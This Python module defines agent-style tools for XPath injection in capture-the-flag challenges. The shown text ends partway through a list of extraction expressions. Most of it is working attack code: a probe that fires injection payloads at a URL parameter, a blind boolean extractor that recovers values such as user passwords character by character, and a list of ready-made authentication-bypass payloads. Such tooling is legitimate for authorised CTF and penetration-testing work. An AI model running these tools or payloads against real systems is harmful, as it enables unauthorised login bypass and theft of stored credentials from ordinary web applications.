"""
XPath Injection tools for CTF solving.

Provides XPath injection detection, blind boolean extraction, and payload generation.
"""

import json
import re
import time
from typing import Dict, List, Optional, Tuple

import requests


class XPathProbeTool:
    """
    XPathProbeTool: detect XPath injection vulnerabilities by sending probe payloads
    and comparing response differentials.

    Tool interface (FAIR-style):
      - `name` and `description` class attributes.
      - `.use(tool_input: str) -> str`, where tool_input is JSON.

    Expected JSON tool_input format:

        {
          "url": "http://target.com/login",
          "param": "username",
          "method": "POST",
          "data": {"password": "test"},
          "headers": {},
          "timeout": 10
        }

    Required: url, param.
    Optional: method (default POST), data, headers, timeout (default 10).
    """

    name: str = "xpath_probe"
    description: str = (
        "Detect XPath injection vulnerabilities by sending probe payloads and comparing "
        "response differentials between true and false conditions. Input must be JSON with "
        "keys: 'url' (target URL), 'param' (parameter to inject into). Optional: 'method' "
        "('GET' or 'POST', default 'POST'), 'data' (additional form data), 'headers', "
        "'timeout' (default 10). Returns analysis of which payloads triggered different "
        "responses indicating XPath injection."
    )

    # Probe payloads: (payload, expected_boolean, description)
    # True-condition probes should return a different response than false-condition probes
    PROBE_PAYLOADS: List[Tuple[str, str, str]] = [
        # True conditions
        ("' or '1'='1", "true", "Basic OR true (single quotes)"),
        ("' or ''='", "true", "OR empty string equals empty string"),
        ("1 or 1=1", "true", "Numeric OR true"),
        ("' or 1=1 or '1'='1", "true", "Double OR true"),
        ("\" or \"1\"=\"1", "true", "Basic OR true (double quotes)"),
        ("') or ('1'='1", "true", "OR true with parentheses"),
        ("' or string-length('a')=1 or '1'='1", "true", "string-length true condition"),
        ("' or true() or '1'='1", "true", "XPath true() function"),
        # False conditions
        ("' and '1'='2", "false", "AND false condition"),
        ("' or '1'='2", "false", "OR false condition"),
        ("1 and 1=2", "false", "Numeric AND false"),
        ("' and false() and '1'='1", "false", "XPath false() function"),
        # Error-inducing probes
        ("'", "error", "Single quote (syntax error)"),
        ("' or ", "error", "Incomplete expression"),
    ]

    def __init__(self, session: Optional[requests.Session] = None) -> None:
        self.session = session or requests.Session()

    def _make_request(
        self,
        url: str,
        method: str,
        param: str,
        payload: str,
        form_data: Dict,
        headers: Dict,
        timeout: int,
    ) -> Tuple[Optional[requests.Response], Optional[str]]:
        """Make HTTP request with payload injected into param."""
        test_data = {**form_data, param: payload}
        try:
            if method == "GET":
                resp = self.session.get(url, params=test_data, headers=headers, timeout=timeout)
            else:
                resp = self.session.post(url, data=test_data, headers=headers, timeout=timeout)
            return resp, None
        except Exception as exc:
            return None, str(exc)

    def _responses_match(
        self,
        resp1: requests.Response,
        resp2: requests.Response,
        threshold: float = 0.9,
    ) -> bool:
        """Check if two responses are similar (indicating same boolean result)."""
        if resp1.status_code != resp2.status_code:
            return False

        len1, len2 = len(resp1.text), len(resp2.text)
        if len1 == 0 and len2 == 0:
            return True
        if len1 == 0 or len2 == 0:
            return False

        ratio = min(len1, len2) / max(len1, len2)
        return ratio >= threshold

    def use(self, tool_input: str) -> str:
        # Parse JSON input
        try:
            data = json.loads(tool_input) if tool_input else {}
        except json.JSONDecodeError as exc:
            return f"[XPathProbeTool] Error: Invalid JSON input. {exc}"

        # Validate required fields
        url = data.get("url")
        if not url or not isinstance(url, str):
            return "[XPathProbeTool] Error: 'url' (string) is required."

        param = data.get("param")
        if not param or not isinstance(param, str):
            return "[XPathProbeTool] Error: 'param' (string) is required."

        method = (data.get("method") or "POST").upper()
        if method not in ("GET", "POST"):
            return "[XPathProbeTool] Error: 'method' must be 'GET' or 'POST'."

        form_data = data.get("data") or {}
        headers = data.get("headers") or {}
        timeout = data.get("timeout", 10)

        output_lines = [
            "[XPathProbeTool] XPath Injection Probe",
            "=" * 50,
            f"Target: {url}",
            f"Method: {method}",
            f"Parameter: {param}",
            "",
        ]

        # Get baseline response (normal input, no injection)
        output_lines.append("Getting baseline response...")
        output_lines.append("-" * 40)

        baseline_resp, error = self._make_request(
            url, method, param, "test_baseline", form_data, headers, timeout
        )
        if error:
            return f"[XPathProbeTool] Error: Could not get baseline response: {error}"

        output_lines.append(
            f"Baseline: Status={baseline_resp.status_code}, Length={len(baseline_resp.text)}"
        )
        output_lines.append("")

        # Send each probe and record responses
        true_responses: List[Tuple[str, requests.Response]] = []
        false_responses: List[Tuple[str, requests.Response]] = []
        error_responses: List[Tuple[str, requests.Response]] = []
        interesting_payloads: List[Dict] = []
        request_errors: List[str] = []

        output_lines.append("Testing probe payloads...")
        output_lines.append("-" * 40)

        for payload, expected_bool, desc in self.PROBE_PAYLOADS:
            resp, err = self._make_request(
                url, method, param, payload, form_data, headers, timeout
            )
            if err:
                request_errors.append(f"  {desc}: {err}")
                continue

            status_info = f"Status={resp.status_code}, Length={len(resp.text)}"
            matches_baseline = self._responses_match(resp, baseline_resp)

            if expected_bool == "true":
                true_responses.append((payload, resp))
                if not matches_baseline:
                    output_lines.append(f"  [+] TRUE  differs from baseline: {desc}")
                    output_lines.append(f"      Payload: {payload}")
                    output_lines.append(f"      Response: {status_info}")
                    interesting_payloads.append({
                        "payload": payload,
                        "type": "true_condition",
                        "desc": desc,
                        "status": resp.status_code,
                        "length": len(resp.text),
                    })
                else:
                    output_lines.append(f"  [-] TRUE  matches baseline: {desc}")

            elif expected_bool == "false":
                false_responses.append((payload, resp))
                if not matches_baseline:
                    output_lines.append(f"  [+] FALSE differs from baseline: {desc}")
                    output_lines.append(f"      Payload: {payload}")
                    output_lines.append(f"      Response: {status_info}")
                    interesting_payloads.append({
                        "payload": payload,
                        "type": "false_condition",
                        "desc": desc,
                        "status": resp.status_code,
                        "length": len(resp.text),
                    })
                else:
                    output_lines.append(f"  [-] FALSE matches baseline: {desc}")

            elif expected_bool == "error":
                error_responses.append((payload, resp))
                if not matches_baseline:
                    output_lines.append(f"  [!] ERROR differs from baseline: {desc}")
                    output_lines.append(f"      Payload: {payload}")
                    output_lines.append(f"      Response: {status_info}")
                    interesting_payloads.append({
                        "payload": payload,
                        "type": "error",
                        "desc": desc,
                        "status": resp.status_code,
                        "length": len(resp.text),
                    })
                else:
                    output_lines.append(f"  [-] ERROR matches baseline: {desc}")

        if request_errors:
            output_lines.append("")
            output_lines.append("Request errors:")
            output_lines.extend(request_errors)

        output_lines.append("")

        # Differential analysis: compare true vs false responses
        output_lines.append("=== Differential Analysis ===")

        injection_detected = False

        if true_responses and false_responses:
            # Compare each true response against each false response
            differentials_found = 0
            for t_payload, t_resp in true_responses:
                for f_payload, f_resp in false_responses:
                    if not self._responses_match(t_resp, f_resp):
                        differentials_found += 1
                        if differentials_found <= 3:  # Show first 3
                            output_lines.append(
                                f"  DIFFERENTIAL: True[{t_payload[:30]}...] vs "
                                f"False[{f_payload[:30]}...]"
                            )
                            output_lines.append(
                                f"    True:  Status={t_resp.status_code}, "
                                f"Length={len(t_resp.text)}"
                            )
                            output_lines.append(
                                f"    False: Status={f_resp.status_code}, "
                                f"Length={len(f_resp.text)}"
                            )

            if differentials_found > 0:
                injection_detected = True
                output_lines.append("")
                output_lines.append(
                    f"  Total differentials: {differentials_found} "
                    f"(out of {len(true_responses) * len(false_responses)} comparisons)"
                )
            else:
                output_lines.append(
                    "  No differentials found between true and false conditions."
                )
        else:
            output_lines.append(
                "  Insufficient responses for differential analysis."
            )

        # Check for XPath-specific error messages
        xpath_error_patterns = [
            (r"XPath", "XPath error reference"),
            (r"xpath", "xpath error reference"),
            (r"XPATH", "XPATH error reference"),
            (r"SimpleXMLElement", "PHP SimpleXML error"),
            (r"xmlXPathEval", "libxml XPath error"),
            (r"DOMXPath", "PHP DOMXPath error"),
            (r"Invalid expression", "Expression evaluation error"),
            (r"Invalid predicate", "XPath predicate error"),
            (r"Unfinished", "Unfinished XPath expression"),
            (r"XPST0003", "XPath static error"),
            (r"javax\.xml\.xpath", "Java XPath error"),
            (r"lxml\.etree", "Python lxml error"),
            (r"XPathException", "XPath exception"),
        ]

        xpath_errors_found = []
        for _, resp in error_responses + true_responses + false_responses:
            for pattern, desc in xpath_error_patterns:
                if re.search(pattern, resp.text):
                    if desc not in xpath_errors_found:
                        xpath_errors_found.append(desc)
                        injection_detected = True

        if xpath_errors_found:
            output_lines.append("")
            output_lines.append("=== XPath Error Messages Detected ===")
            for err_desc in xpath_errors_found:
                output_lines.append(f"  [!] {err_desc}")

        # Check for flags in responses
        flag_patterns = [
            r"(picoCTF\{[^}]+\})",
            r"(HTB\{[^}]+\})",
            r"(THM\{[^}]+\})",
            r"(FLAG\{[^}]+\})",
            r"(CTF\{[^}]+\})",
            r"(flag\{[^}]+\})",
        ]

        flags_found = []
        for _, resp in true_responses + false_responses + error_responses:
            for pattern in flag_patterns:
                match = re.search(pattern, resp.text, re.IGNORECASE)
                if match and match.group(1) not in flags_found:
                    flags_found.append(match.group(1))

        if flags_found:
            output_lines.append("")
            output_lines.append("!!! FLAGS FOUND !!!")
            for flag in flags_found:
                output_lines.append(f"  {flag}")

        # Summary
        output_lines.append("")
        output_lines.append("=== Summary ===")
        if injection_detected:
            output_lines.append("[!] XPath INJECTION DETECTED!")
            output_lines.append("")
            output_lines.append("RECOMMENDATIONS:")
            output_lines.append("  1. Use xpath_blind_boolean tool to extract data")
            output_lines.append("  2. Use xpath_payload_generator for auth bypass payloads")
            output_lines.append("  3. Try extracting node names with: count(//*)  and  name(//*[1])")
            output_lines.append("  4. Check for inverted oracles (success message = false condition)")
        else:
            output_lines.append("[-] No obvious XPath injection detected.")
            output_lines.append("")
            output_lines.append("RECOMMENDATIONS:")
            output_lines.append("  - Try different parameters")
            output_lines.append("  - Check if input is used in a different XPath context")
            output_lines.append("  - Try double-quote variants if single-quote probes failed")
            output_lines.append("  - Consider that responses may use an inverted oracle")

        return "\n".join(output_lines)


class XPathBlindBooleanTool:
    """
    XPathBlindBooleanTool: Extract data using boolean-based blind XPath injection.

    Supports inverted oracle detection, where the "success" indicator actually
    corresponds to a FALSE condition (common in CTF challenges).

    Tool interface (FAIR-style):
      - `name` and `description` class attributes.
      - `.use(tool_input: str) -> str`, where tool_input is JSON.

    Expected JSON tool_input format:

        {
          "url": "http://target.com/login",
          "param": "username",
          "operation": "extract_string",
          "xpath_expression": "//user[1]/password",
          "true_indicator": "Welcome",
          "false_indicator": "Invalid",
          "method": "POST",
          "data": {"password": "test"},
          "headers": {},
          "detect_inversion": true,
          "max_length": 50,
          "timeout": 10
        }

    Operations:
      - test_condition: Test a single XPath boolean condition
      - extract_char: Extract a single character at a given position
      - extract_string: Extract a full string character by character

    Required: url, param, operation.
    Optional: xpath_expression (required for extract_*), true_indicator,
              false_indicator, method (default POST), data, headers,
              detect_inversion (default true), max_length (default 50),
              timeout (default 10).
    """

    name: str = "xpath_blind_boolean"
    description: str = (
        "Extract data using boolean-based blind XPath injection with inverted oracle "
        "detection. Input must be JSON with keys: 'url' (target URL), 'param' (parameter "
        "to inject), 'operation' ('test_condition', 'extract_char', or 'extract_string'). "
        "Optional: 'xpath_expression' (XPath to extract, e.g. '//user[1]/password'), "
        "'true_indicator' (string in true responses), 'false_indicator' (string in false "
        "responses), 'method' ('GET' or 'POST', default 'POST'), 'data' (form data), "
        "'headers', 'detect_inversion' (auto-detect if oracle is inverted, default true), "
        "'max_length' (max chars to extract, default 50), 'timeout' (default 10). "
        "Returns extracted data or condition test results."
    )

    # Printable ASCII range for binary search
    ASCII_LOW: int = 32
    ASCII_HIGH: int = 126

    def __init__(self, session: Optional[requests.Session] = None) -> None:
        self.session = session or requests.Session()

    def _make_request(
        self,
        url: str,
        method: str,
        param: str,
        payload: str,
        form_data: Dict,
        headers: Dict,
        timeout: int,
    ) -> Tuple[Optional[requests.Response], Optional[str]]:
        """Make HTTP request with payload injected into param."""
        test_data = {**form_data, param: payload}
        try:
            if method == "GET":
                resp = self.session.get(url, params=test_data, headers=headers, timeout=timeout)
            else:
                resp = self.session.post(url, data=test_data, headers=headers, timeout=timeout)
            return resp, None
        except Exception as exc:
            return None, str(exc)

    def _responses_match(
        self,
        resp1: requests.Response,
        resp2: requests.Response,
        threshold: float = 0.9,
    ) -> bool:
        """Check if two responses are similar (indicating same boolean result)."""
        if resp1.status_code != resp2.status_code:
            return False

        len1, len2 = len(resp1.text), len(resp2.text)
        if len1 == 0 and len2 == 0:
            return True
        if len1 == 0 or len2 == 0:
            return False

        ratio = min(len1, len2) / max(len1, len2)
        return ratio >= threshold

    def _is_true_response(
        self,
        resp: requests.Response,
        true_indicator: Optional[str],
        false_indicator: Optional[str],
        true_baseline: Optional[requests.Response],
        inverted: bool,
    ) -> bool:
        """
        Determine if a response indicates a TRUE condition.

        If inverted=True, the logic is flipped: a response matching the
        true_indicator actually means the condition is FALSE.
        """
        result = False

        # Indicator-based detection
        if true_indicator and false_indicator:
            has_true = true_indicator.lower() in resp.text.lower()
            has_false = false_indicator.lower() in resp.text.lower()
            if has_true and not has_false:
                result = True
            elif has_false and not has_true:
                result = False
            elif true_baseline is not None:
                result = self._responses_match(resp, true_baseline)
            else:
                result = has_true
        elif true_indicator:
            result = true_indicator.lower() in resp.text.lower()
        elif false_indicator:
            result = false_indicator.lower() not in resp.text.lower()
        elif true_baseline is not None:
            result = self._responses_match(resp, true_baseline)
        else:
            # No indicators and no baseline - cannot determine
            result = False

        # Flip result if oracle is inverted
        if inverted:
            result = not result

        return result

    def _detect_oracle_inversion(
        self,
        url: str,
        method: str,
        param: str,
        form_data: Dict,
        headers: Dict,
        timeout: int,
        true_indicator: Optional[str],
        false_indicator: Optional[str],
    ) -> Tuple[bool, List[str]]:
        """
        Detect if the oracle is inverted by sending known-true and known-false
        XPath conditions and checking which response contains which indicator.

        Returns (is_inverted, log_lines).
        """
        logs = []
        logs.append("Detecting oracle inversion...")
        logs.append("-" * 40)

        # Known-true condition: 1=1
        known_true_payload = "' or '1'='1"
        true_resp, err = self._make_request(
            url, method, param, known_true_payload, form_data, headers, timeout
        )
        if err:
            logs.append(f"  Error sending known-true: {err}")
            return False, logs

        # Known-false condition: 1=2
        known_false_payload = "' or '1'='2"
        false_resp, err = self._make_request(
            url, method, param, known_false_payload, form_data, headers, timeout
        )
        if err:
            logs.append(f"  Error sending known-false: {err}")
            return False, logs

        logs.append(
            f"  Known TRUE  ('1'='1'): Status={true_resp.status_code}, "
            f"Length={len(true_resp.text)}"
        )
        logs.append(
            f"  Known FALSE ('1'='2'): Status={false_resp.status_code}, "
            f"Length={len(false_resp.text)}"
        )

        # Check if responses differ
        if self._responses_match(true_resp, false_resp):
            logs.append("  Responses are similar - cannot determine inversion.")
            logs.append("  Defaulting to non-inverted oracle.")
            return False, logs

        # Check indicators in responses
        inverted = False
        if true_indicator:
            true_in_true = true_indicator.lower() in true_resp.text.lower()
            true_in_false = true_indicator.lower() in false_resp.text.lower()

            logs.append(
                f"  true_indicator '{true_indicator}' in TRUE response: {true_in_true}"
            )
            logs.append(
                f"  true_indicator '{true_indicator}' in FALSE response: {true_in_false}"
            )

            if true_in_false and not true_in_true:
                inverted = True
                logs.append("  INVERTED ORACLE DETECTED!")
                logs.append(
                    "  The 'success' indicator appears in FALSE conditions."
                )
            elif true_in_true and not true_in_false:
                logs.append("  Oracle is NORMAL (not inverted).")
            else:
                logs.append("  Indicator appears in both or neither - using response length.")
                # Fall back to response length comparison
                # Typically the "success" page is longer, so if the false response
                # is longer, the oracle is inverted
                if len(false_resp.text) > len(true_resp.text) * 1.1:
                    inverted = True
                    logs.append("  INVERTED ORACLE DETECTED (by response length)!")

        elif false_indicator:
            false_in_true = false_indicator.lower() in true_resp.text.lower()
            false_in_false = false_indicator.lower() in false_resp.text.lower()

            logs.append(
                f"  false_indicator '{false_indicator}' in TRUE response: {false_in_true}"
            )
            logs.append(
                f"  false_indicator '{false_indicator}' in FALSE response: {false_in_false}"
            )

            if false_in_true and not false_in_false:
                inverted = True
                logs.append("  INVERTED ORACLE DETECTED!")
            elif false_in_false and not false_in_true:
                logs.append("  Oracle is NORMAL (not inverted).")
        else:
            # No indicators - use response length heuristic
            logs.append("  No indicators provided - using response differential only.")
            logs.append("  Assuming non-inverted oracle (use true_indicator/false_indicator for accuracy).")

        return inverted, logs

    def _binary_search_char(
        self,
        url: str,
        method: str,
        param: str,
        xpath_expression: str,
        position: int,
        form_data: Dict,
        headers: Dict,
        timeout: int,
        true_indicator: Optional[str],
        false_indicator: Optional[str],
        true_baseline: Optional[requests.Response],
        inverted: bool,
        payload_prefix: str,
        payload_suffix: str,
    ) -> Tuple[Optional[str], List[str]]:
        """Use binary search to find the character at a given position in an XPath value."""
        logs = []
        low, high = self.ASCII_LOW, self.ASCII_HIGH

        while low <= high:
            mid = (low + high) // 2

            # Build XPath condition: substring(expr, pos, 1) > chr(mid)
            # We use the > comparison for binary search
            condition = (
                f"substring({xpath_expression},{position},1)>"
                f"'{chr(mid)}'"
            )
            payload = f"{payload_prefix} or ({condition}) or {payload_suffix}"

            resp, error = self._make_request(
                url, method, param, payload, form_data, headers, timeout
            )
            if error:
                logs.append(f"  Error at mid={mid}: {error}")
                return None, logs

            is_true = self._is_true_response(
                resp, true_indicator, false_indicator, true_baseline, inverted
            )

            if is_true:
                logs.append(
                    f"  char>{chr(mid)} (ASCII {mid}): TRUE -> char > '{chr(mid)}'"
                )
                low = mid + 1
            else:
                logs.append(
                    f"  char>{chr(mid)} (ASCII {mid}): FALSE -> char <= '{chr(mid)}'"
                )
                high = mid - 1

        if self.ASCII_LOW <= low <= self.ASCII_HIGH + 1:
            # Verify the character is not null (end of string)
            # Test: substring(expr, pos, 1) = ''
            empty_condition = f"substring({xpath_expression},{position},1)=''"
            empty_payload = f"{payload_prefix} or ({empty_condition}) or {payload_suffix}"

            empty_resp, error = self._make_request(
                url, method, param, empty_payload, form_data, headers, timeout
            )
            if not error:
                is_empty = self._is_true_response(
                    empty_resp, true_indicator, false_indicator, true_baseline, inverted
                )
                if is_empty:
                    logs.append(f"  Position {position} is empty (end of string)")
                    return None, logs

            if low <= self.ASCII_HIGH:
                char = chr(low)
                logs.append(f"  Found: '{char}' (ASCII {low})")
                return char, logs

        logs.append(f"  Could not determine character (low={low}, high={high})")
        return None, logs

    def use(self, tool_input: str) -> str:
        # Parse JSON input
        try:
            data = json.loads(tool_input) if tool_input else {}
        except json.JSONDecodeError as exc:
            return f"[XPathBlindBooleanTool] Error: Invalid JSON input. {exc}"

        # Validate required fields
        url = data.get("url")
        if not url or not isinstance(url, str):
            return "[XPathBlindBooleanTool] Error: 'url' (string) is required."

        param = data.get("param")
        if not param or not isinstance(param, str):
            return "[XPathBlindBooleanTool] Error: 'param' (string) is required."

        operation = data.get("operation")
        if not operation or operation not in ("test_condition", "extract_char", "extract_string"):
            return (
                "[XPathBlindBooleanTool] Error: 'operation' must be 'test_condition', "
                "'extract_char', or 'extract_string'."
            )

        method = (data.get("method") or "POST").upper()
        if method not in ("GET", "POST"):
            return "[XPathBlindBooleanTool] Error: 'method' must be 'GET' or 'POST'."

        xpath_expression = data.get("xpath_expression", "")
        true_indicator = data.get("true_indicator")
        false_indicator = data.get("false_indicator")
        form_data = data.get("data") or {}
        headers = data.get("headers") or {}
        detect_inversion = data.get("detect_inversion", True)
        max_length = data.get("max_length", 50)
        timeout = data.get("timeout", 10)
        payload_prefix = data.get("payload_prefix", "'")
        payload_suffix = data.get("payload_suffix", "'1'='1")
        position = data.get("position", 1)
        condition = data.get("condition", "")

        output_lines = [
            "[XPathBlindBooleanTool] Blind Boolean XPath Injection",
            "=" * 50,
            f"Target: {url}",
            f"Method: {method}",
            f"Parameter: {param}",
            f"Operation: {operation}",
            "",
        ]

        # Detect oracle inversion if requested
        inverted = False
        if detect_inversion:
            inverted, inversion_logs = self._detect_oracle_inversion(
                url, method, param, form_data, headers, timeout,
                true_indicator, false_indicator,
            )
            output_lines.extend(inversion_logs)
            output_lines.append("")

        # Establish baseline true response for comparison
        true_baseline = None
        known_true_payload = "' or '1'='1"
        true_resp, error = self._make_request(
            url, method, param, known_true_payload, form_data, headers, timeout
        )
        if error:
            output_lines.append(f"Warning: Could not get true baseline: {error}")
        else:
            true_baseline = true_resp
            output_lines.append(
                f"True baseline: Status={true_resp.status_code}, "
                f"Length={len(true_resp.text)}"
            )

        known_false_payload = "' or '1'='2"
        false_resp, error = self._make_request(
            url, method, param, known_false_payload, form_data, headers, timeout
        )
        if error:
            output_lines.append(f"Warning: Could not get false baseline: {error}")
        else:
            output_lines.append(
                f"False baseline: Status={false_resp.status_code}, "
                f"Length={len(false_resp.text)}"
            )

        output_lines.append("")

        if operation == "test_condition":
            # Test a single condition
            if not condition:
                output_lines.append(
                    "No 'condition' provided. Testing default true/false conditions..."
                )
                output_lines.append("")

                # Test true condition
                test_payload = "' or '1'='1"
                resp, error = self._make_request(
                    url, method, param, test_payload, form_data, headers, timeout
                )
                if error:
                    output_lines.append(f"Error testing true condition: {error}")
                else:
                    is_true = self._is_true_response(
                        resp, true_indicator, false_indicator, true_baseline, inverted
                    )
                    output_lines.append(
                        f"Condition '1'='1': {'TRUE' if is_true else 'FALSE'} "
                        f"(Status={resp.status_code}, Length={len(resp.text)})"
                    )

                # Test false condition
                test_payload = "' or '1'='2"
                resp, error = self._make_request(
                    url, method, param, test_payload, form_data, headers, timeout
                )
                if error:
                    output_lines.append(f"Error testing false condition: {error}")
                else:
                    is_true = self._is_true_response(
                        resp, true_indicator, false_indicator, true_baseline, inverted
                    )
                    output_lines.append(
                        f"Condition '1'='2': {'TRUE' if is_true else 'FALSE'} "
                        f"(Status={resp.status_code}, Length={len(resp.text)})"
                    )

                output_lines.append("")
                output_lines.append("RESULT: Boolean conditions are working.")
                output_lines.append(f"Oracle inversion: {'YES' if inverted else 'NO'}")
                output_lines.append("")
                output_lines.append("NEXT STEPS:")
                output_lines.append("  1. Use operation='extract_char' to extract single characters")
                output_lines.append("  2. Use operation='extract_string' to extract full values")
                output_lines.append(
                    "  3. Try xpath_expression='//user[1]/password' for password extraction"
                )
            else:
                # Test the provided condition
                payload = f"{payload_prefix} or ({condition}) or {payload_suffix}"
                resp, error = self._make_request(
                    url, method, param, payload, form_data, headers, timeout
                )
                if error:
                    output_lines.append(f"Error testing condition: {error}")
                else:
                    is_true = self._is_true_response(
                        resp, true_indicator, false_indicator, true_baseline, inverted
                    )
                    output_lines.append(
                        f"Condition: {condition}"
                    )
                    output_lines.append(
                        f"RESULT: {'TRUE' if is_true else 'FALSE'} "
                        f"(Status={resp.status_code}, Length={len(resp.text)})"
                    )

        elif operation == "extract_char":
            if not xpath_expression:
                return (
                    "[XPathBlindBooleanTool] Error: 'xpath_expression' is required "
                    "for extract_char operation."
                )

            output_lines.append(f"Extracting character at position {position}")
            output_lines.append(f"XPath expression: {xpath_expression}")
            output_lines.append(f"Oracle inverted: {inverted}")
            output_lines.append("-" * 40)

            char, logs = self._binary_search_char(
                url, method, param, xpath_expression, position,
                form_data, headers, timeout,
                true_indicator, false_indicator, true_baseline, inverted,
                payload_prefix, payload_suffix,
            )

            output_lines.extend(logs)
            output_lines.append("")

            if char is not None:
                output_lines.append(
                    f"RESULT: Character at position {position} = '{char}' (ASCII {ord(char)})"
                )
            else:
                output_lines.append(
                    f"RESULT: Could not extract character at position {position}."
                )

        elif operation == "extract_string":
            if not xpath_expression:
                return (
                    "[XPathBlindBooleanTool] Error: 'xpath_expression' is required "
                    "for extract_string operation."
                )

            output_lines.append(f"Extracting string from: {xpath_expression}")
            output_lines.append(f"Max length: {max_length}")
            output_lines.append(f"Oracle inverted: {inverted}")
            output_lines.append("-" * 40)

            # First, try to determine string length
            output_lines.append("Determining string length...")
            string_length = None

            for test_len in range(1, max_length + 1):
                len_condition = f"string-length({xpath_expression})>={test_len}"
                len_payload = f"{payload_prefix} or ({len_condition}) or {payload_suffix}"

                resp, error = self._make_request(
                    url, method, param, len_payload, form_data, headers, timeout
                )
                if error:
                    output_lines.append(f"  Error at length {test_len}: {error}")
                    break

                is_true = self._is_true_response(
                    resp, true_indicator, false_indicator, true_baseline, inverted
                )

                if not is_true:
                    string_length = test_len - 1
                    break

            if string_length is None:
                string_length = max_length
                output_lines.append(
                    f"  Could not determine exact length, using max_length={max_length}"
                )
            else:
                output_lines.append(f"  String length: {string_length}")

            if string_length == 0:
                output_lines.append("")
                output_lines.append("RESULT: Empty string (length 0)")
                return "\n".join(output_lines)

            output_lines.append("")
            output_lines.append("Extracting characters...")
            output_lines.append("-" * 40)

            extracted = ""
            consecutive_failures = 0
            max_consecutive_failures = 3

            for pos in range(1, string_length + 1):
                char, logs = self._binary_search_char(
                    url, method, param, xpath_expression, pos,
                    form_data, headers, timeout,
                    true_indicator, false_indicator, true_baseline, inverted,
                    payload_prefix, payload_suffix,
                )

                # Only include the final result line, not all binary search steps
                if char is not None:
                    extracted += char
                    consecutive_failures = 0
                    output_lines.append(
                        f"  Position {pos}: '{char}' -> \"{extracted}\""
                    )
                else:
                    consecutive_failures += 1
                    output_lines.append(
                        f"  Position {pos}: [end of string or extraction failed]"
                    )
                    if consecutive_failures >= max_consecutive_failures:
                        output_lines.append(
                            f"  Stopping after {max_consecutive_failures} consecutive failures"
                        )
                        break

            output_lines.append("")
            output_lines.append("=" * 50)
            output_lines.append(f"EXTRACTED DATA: \"{extracted}\"")
            output_lines.append(f"Length: {len(extracted)} characters")

            # Check for CTF flags
            flag_patterns = [
                r"(picoCTF\{[^}]+\})",
                r"(HTB\{[^}]+\})",
                r"(THM\{[^}]+\})",
                r"(FLAG\{[^}]+\})",
                r"(CTF\{[^}]+\})",
                r"(flag\{[^}]+\})",
            ]
            for pattern in flag_patterns:
                match = re.search(pattern, extracted, re.IGNORECASE)
                if match:
                    output_lines.append("")
                    output_lines.append(f"!!! FLAG DETECTED: {match.group(1)} !!!")
                    break

        return "\n".join(output_lines)


class XPathPayloadGenerator:
    """
    XPathPayloadGenerator: generate XPath injection payloads for various attack scenarios.

    Pure payload generation - no HTTP session required.

    Tool interface (FAIR-style):
      - `name` and `description` class attributes.
      - `.use(tool_input: str) -> str`, where tool_input is JSON.

    Expected JSON tool_input format:

        {
          "operation": "auth_bypass"
        }

    Operations:
      - auth_bypass: Common authentication bypass XPath payloads
      - data_extraction: substring() templates for blind extraction
      - enumeration: count(), name(), string-length() payloads
    """

    name: str = "xpath_payload_generator"
    description: str = (
        "Generate XPath injection payloads for common attack scenarios. Input must be JSON "
        "with key 'operation': 'auth_bypass' (authentication bypass payloads), "
        "'data_extraction' (substring templates for blind extraction), or 'enumeration' "
        "(count/name/string-length payloads for schema discovery). No HTTP session needed - "
        "pure payload generation. Returns ready-to-use XPath injection payloads."
    )

    # Authentication bypass payloads
    AUTH_BYPASS_PAYLOADS: List[Dict[str, str]] = [
        {
            "payload": "' or '1'='1",
            "context": "Single-quote string context",
            "description": "Basic OR true - bypasses: //user[name='INPUT']/pass",
        },
        {
            "payload": "' or ''='",
            "context": "Single-quote string context",
            "description": "OR empty=empty (always true)",
        },
        {
            "payload": "' or 1=1 or '1'='1",
            "context": "Single-quote string context",
            "description": "Double OR to ensure true evaluation",
        },
        {
            "payload": "\" or \"1\"=\"1",
            "context": "Double-quote string context",
            "description": "Basic OR true for double-quote contexts",
        },
        {
            "payload": "\" or \"\"=\"",
            "context": "Double-quote string context",
            "description": "OR empty=empty for double-quote contexts",
        },
        {
            "payload": "') or ('1'='1",
            "context": "Parenthesized single-quote",
            "description": "Bypass with parentheses: //user[(name='INPUT')]/pass",
        },
        {
            "payload": "\") or (\"1\"=\"1",
            "context": "Parenthesized double-quote",
            "description": "Bypass with parentheses for double-quote contexts",
        },
        {
            "payload": "' or true() or '1'='1",
            "context": "Single-quote string context",
            "description": "Using XPath true() function",
        },
        {
            "payload": "' or string-length('a')>0 or '1'='1",
            "context": "Single-quote string context",
            "description": "Using string-length() as true condition",
        },
        {
            "payload": "admin' or '1'='1",
            "context": "Username field with known user",
            "description": "Bypass with known username prefix",
        },
        {
            "payload": "' or position()>0 or '1'='1",
            "context": "Single-quote string context",
            "description": "Using position() function (always >0 in node context)",
        },
        {
            "payload": "' or count(//*)>0 or '1'='1",
            "context": "Single-quote string context",
            "description": "Using count() - document always has nodes",
        },
        {
            "payload": "']|//*|//*['",
            "context": "Attribute value injection",
            "description": "Break out of attribute and select all nodes",
        },
        {
            "payload": "' or name()='user' or '1'='1",
            "context": "Single-quote, guessing node name",
            "description": "True if current node is named 'user'",
        },
        {
            "payload": "x']|//user/*|//user['x",
            "context": "Attribute value injection",
            "description": "UNION-style to dump all user child nodes",
        },
    ]

    # Data extraction templates (for blind boolean injection)
    DATA_EXTRACTION_TEMPLATES: List[Dict[str, str]] = [
        {
            "template": "substring({expr},{pos},1)='{char}'",
            "description": "Test if character at position equals a specific character",
            "usage": "Replace {expr} with XPath expression, {pos} with position (1-indexed), {char} with test character",
        },
        {
            "template": "substring({expr},{pos},1)>'{char}'",
            "description": "Binary search: test if character at position is greater than test char",
            "usage": "Use for binary search - narrow down ASCII range",
        },
        {
            "template": "string-length({expr})={len}",
            "description": "Test exact string length",
            "usage": "Replace {expr} with XPath expression, {len} with test length",
        },
        {
            "template": "string-length({expr})>{len}",
            "description": "Binary search for string length (greater than)",
            "usage": "Use for binary search to find string length",
        },
        {
            "template": "contains({expr},'{substr}')",
            "description": "Test if expression contains a substring",
            "usage": "Quick check if value contains known text (e.g., 'flag', 'admin')",
        },
        {
            "template": "starts-with({expr},'{prefix}')",
            "description": "Test if expression starts with a prefix",
            "usage": "Useful for quickly narrowing down values",
        },
        {
            "template": "translate({expr},'ABCDEFGHIJKLMNOPQRSTUVWXYZ','abcdefghijklmnopqrstuvwxyz')='{lower}'",
            "description": "Case-insensitive comparison using translate()",
            "usage": "Compare lowercase version of extracted value",
        },
    ]

    # Common XPath expressions for extraction
    COMMON_EXPRESSIONS: List[Dict[str, str]] = [
        {
            "expression": "//user[1]/password",
            "description": "First user's password",
